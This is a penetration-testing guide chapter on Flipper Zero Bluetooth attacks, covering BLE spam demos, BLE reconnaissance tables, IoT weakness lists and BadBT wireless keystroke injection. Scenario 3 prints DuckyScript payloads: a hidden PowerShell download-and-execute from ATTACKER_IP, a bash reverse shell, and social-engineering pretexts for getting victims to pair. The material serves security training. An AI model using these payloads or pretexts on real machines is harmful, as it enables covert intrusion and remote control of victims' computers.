## Penetration Testing Scenarios

### Scenario 1: BLE Spam for Disruption and Awareness

**Context:** Security awareness demo for management or employees. Objective: demonstrate that BLE is not "secure by default" and that unsolicited popups can appear on any smartphone.

**Procedure:**

1. **Preparation:** Inform the company's responsible person/CISO. Obtain written authorization
2. **Positioning:** Place the Flipper in a central position (e.g., center of the meeting room table)
3. **Launch:** Activate BLE Spam in "All" mode or select a specific vendor
4. **Observation:** Wait 15-30 seconds - popups begin appearing on the attendees' smartphones
5. **Demo:** Show how the popups appear, explain the technical mechanism
6. **Mitigation:** Show how to disable popups for each OS (iOS, Android, Windows)
7. **Documentation:** Screenshots of the popups for the report

**Educational objective:**

- Bluetooth is not invisible or secure just because it "doesn't transfer data"
- Advertising packets can be forged by anyone
- Proximity pairing notifications are a social engineering vector
- Mitigations exist and are simple to apply

**Operational risks:**

- In sensitive environments (hospitals, airports), popups can generate panic
- Some users might click "Connect" by mistake
- BLE Spam can interfere with legitimate BLE devices nearby
- In corporate environments with MDM, Bluetooth might be centrally managed

### Scenario 2: BLE Scanning for OSINT and Reconnaissance

**Context:** Mapping the wireless environment of a target during a physical pentest. Objective: identify active BLE devices, employee wearables, smart locks, trackers, IoT devices.

**Procedure:**

1. **Walk through the target area** with the Flipper in BLE scanner mode
2. **Record** all devices found: MAC, name, RSSI, services
3. **Analyze** device names to identify device types (e.g., "Fitbit Charge 5" = employee wearable)
4. **Map** RSSI values to estimate positions of fixed devices (locks, beacons)
5. **Identify** potentially vulnerable IoT devices

**What to look for:**

| Device | Indicator | Relevance |
|---|---|---|
| Smart locks | Name "August", "Yale", "Nuki", service 0xFE24 | High - possible physical access |
| Trackers | Name "AirTag", "Tile", "SmartTag" | Medium - OSINT on movements |
| Wearables | Name "Fitbit", "Garmin", "Apple Watch" | Medium - OSINT on employees |
| Beacons | Service 0xFEAA (Eddystone), 0x180F | Medium - infrastructure mapping |
| Smart building | Name "Philips Hue", "LIFX", thermostat | Medium - IoT attack surface |
| Medical | Name with "CGM", "Pump", medical prefixes | High - medical devices (do not touch!) |
| BLE printers | Name with "HP", "Brother", "Canon" | Low - infrastructure info |

**MAC address analysis:**

The first 3 bytes of the MAC address (OUI - Organizationally Unique Identifier) identify the vendor:

- `38:C9:86:xx:xx:xx` - Samsung
- `DC:A6:32:xx:xx:xx` - Raspberry Pi
- `E8:AB:FA:xx:xx:xx` - Shenzhen Bilian Electronic
- `A4:C1:38:xx:xx:xx` - Apple

**NOTE:** Most modern BLE devices use randomized MAC addresses (Random Private Address), making OUI lookup ineffective. However, many cheap and legacy IoT devices still use public MACs.

> **Personal note:** During an assessment of a corporate building, I found 47 active BLE devices on a single floor. Of these, 12 were smart locks (August and Nuki), 8 were beacons for indoor positioning, 15 were employee wearables (Fitbit, Apple Watch, Garmin), and the rest was a mix of smartphones and various IoT devices. The smart locks were the most relevant finding - their mere presence in BLE advertising reveals their exact position and model, information useful for a physical attacker.

### Scenario 3: BadBT for Wireless Payload Delivery

**Context:** Executing HID payloads on a target without direct physical access, leveraging the Flipper's BLE HID as a wireless keyboard.

**Prerequisites:**

- The Flipper must be paired with the target (this is the main constraint)
- The target must have Bluetooth enabled
- The target must be unlocked (or the payload must handle the lock screen)

**Detailed procedure:**

**Phase 1: Pairing**

Pairing is the critical phase. Options:

a) **Social engineering** - Ask the user to connect "a Bluetooth keyboard for the demo"
b) **Prior access** - Pairing during a previous work session
c) **Unattended device** - The target is unlocked and unattended (policy violation)
d) **Auto-accept** - Some devices/OSes accept HID without explicit confirmation (rare but possible)

**Phase 2: Payload preparation**

Create the DuckyScript script for the desired payload. Example for a reverse shell on Windows:

```
REM BadBT - Reverse Shell Windows
REM Author: [redacted]
REM Target: Windows 10/11 with PowerShell
DELAY 3000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
ENTER
DELAY 1000
```

Example for macOS:

```
REM BadBT - Reverse Shell macOS
DELAY 3000
GUI SPACE
DELAY 500
STRING Terminal
ENTER
DELAY 1000
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
ENTER
```

**Phase 3: Execution**

1. Load the script onto the Flipper
2. Launch BadBT
3. Wait for the connection (automatic if bonded)
4. The script executes automatically
5. The payload is typed as if by a user at the keyboard

**Operational considerations:**

- BLE typing speed is slower than USB - long scripts take more time
- The target might see the prompt/terminal window open
- In environments with EDR/antivirus, the payload might be blocked
- BLE HID is logged in the target's Bluetooth logs
- The Flipper device name appears in the target's Bluetooth list

> **Personal note:** BadBT is underestimated as an attack vector. In an engagement, I used it combined with social engineering: during a security workshop, I asked participants to connect the "Bluetooth presenter" (the Flipper). Pairing completed by 8 people. In the following days, I was able to execute scripts on 5 of those laptops from the adjacent meeting room (bonding was persistent and reconnection was automatic). Naturally, the payload was benign (it opened Notepad and typed "You've been hacked - Security Awareness Training"), but it demonstrated the risk in a very concrete way.

### Scenario 4: IoT BLE Device Security Analysis

**Context:** Security assessment of IoT devices that use BLE for communication. Typical targets: smart locks, trackers, wearables, IoT sensors.

**BLE attack surface of an IoT device:**

```
+------------------+
| Advertising      | <-- What does it expose? Name, services, MAC
+------------------+
        |
+------------------+
| Pairing/Bonding  | <-- How does it authenticate? Just Works? Passkey? OOB?
+------------------+
        |
+------------------+
| GATT Services    | <-- What services does it expose? Are they protected?
+------------------+
        |
+------------------+
| Data in Transit  | <-- Is data encrypted? Integrity?
+------------------+
        |
+------------------+
| Firmware Update  | <-- Secure OTA update? Signed? Verified?
+------------------+
```

**What the Flipper can do:**

- Scan and identify the device
- Read exposed GATT services (if not protected)
- Attempt pairing with different modes
- Send advertising to test device reaction
- Emulate the device (in some cases)

**What the Flipper CANNOT do (other hardware needed):**

- Complete BLE traffic sniffing (requires Ubertooth or nRF52840)
- MITM on existing connections (requires dedicated setup)
- Real-time pairing key cracking (requires computing power)
- Advanced GATT fuzzing (requires dedicated framework like BLEzzer or GATTacker)
- Target device firmware analysis

**Common vulnerabilities in BLE IoT devices:**

| Vulnerability | Description | Impact |
|---|---|---|
| Just Works pairing | No authentication in pairing | Anyone can connect |
| Unprotected GATT | Characteristics readable/writable without auth | Data read/modification |
| Cleartext data | Unencrypted communication after connection | Data sniffing |
| Fixed MAC | Non-randomized MAC address | Device tracking |
| Revealing device name | "NukiLock_ABC123" in advertising | OSINT, identification |
| Unsigned OTA | Firmware update without digital signature | Malicious firmware |
| Replay vulnerable | Reproducible BLE commands | Replay lock opening |
| No rate limiting | No limit on authentication attempts | PIN brute force |

---

## Cross-Reference - Multi-Vector Scenarios

| Scenario | Related Module | Link | How They Connect |
|----------|-----------------|------|-------------------|
| BLE spam + BadUSB | USB/Bad USB | [05-Scenari-Reali](../USB/Bad%20USB/05-Scenari-Reali.md) | BLE spam as distraction -> BadUSB drop while attention is elsewhere |
| BLE device + WiFi | WiFi-Marauder | [05-Scenari-Reali](../WiFi-Marauder/05-Scenari-Reali.md) | Identify BLE IoT devices -> WiFi scan to find their gateway |
| BLE lock + NFC | NFC | [05-Scenari-Reali](../NFC/05-Scenari-Reali.md) | Smart locks: BLE for remote opening + NFC as physical backup |
| BLE + Sub-GHz | Sub-GHz | [05-Scenari-Reali](../Sub-GHz/05-Scenari-Reali.md) | Home automation: BLE devices + Sub-GHz sensors in the same ecosystem |
| BLE tracking + RFID | RFID | [05-Scenari-Reali](../RFID/05-Scenari-Reali.md) | BLE wearable analysis of employees + RFID badge cloning for access |
